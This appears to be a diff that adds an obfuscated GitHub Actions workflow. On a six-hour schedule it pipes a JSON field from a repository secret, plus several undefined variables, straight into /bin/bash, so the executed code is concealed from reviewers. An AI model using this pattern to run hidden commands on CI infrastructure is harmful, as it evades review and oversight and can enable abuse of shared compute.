@@ -1,0 +1,20 @@
+name: zhangnubi4567
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhangnubi4567
+        env:
+          uz4: ${{ secrets.uz4 }}
+        run: |
+          echo $uz4 | jq -r .jatxs847 | /bin/bash
+          echo $xrr3623 | jq -r .pd982 | /bin/bash
+          echo $m84 | jq -r .pguqw0 | /bin/bash
+          echo $aovtw32993 | jq -r .x21016 | /bin/bash
+
